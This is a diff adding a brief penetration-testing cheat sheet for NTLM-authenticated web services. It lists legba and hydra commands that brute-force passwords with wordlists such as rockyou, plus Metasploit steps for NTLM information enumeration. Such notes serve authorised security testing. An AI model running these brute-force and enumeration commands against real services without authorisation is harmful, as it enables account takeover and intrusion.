@@ -1,0 +1,18 @@
+NTLM HTTP
+
+BRUTE FORCE WITH LEGBA
+legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
+legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
+
+BRUTEFORCE WITH HYDRA
+hydra -L users -p /usr/share/wordlists/rockyou.txt  https-get://host:443/:A=NTLM:F=401
+
+
+Enumeracion con MS
+msf > use auxiliary/scanner/http/ntlm_info_enumeration
+msf auxiliary(ntlm_info_enumeration) > show actions
+    ...actions...
+msf auxiliary(ntlm_info_enumeration) > set ACTION < action-name >
+msf auxiliary(ntlm_info_enumeration) > show options
+    ...show and set options...
+msf auxiliary(ntlm_info_enumeration) > run
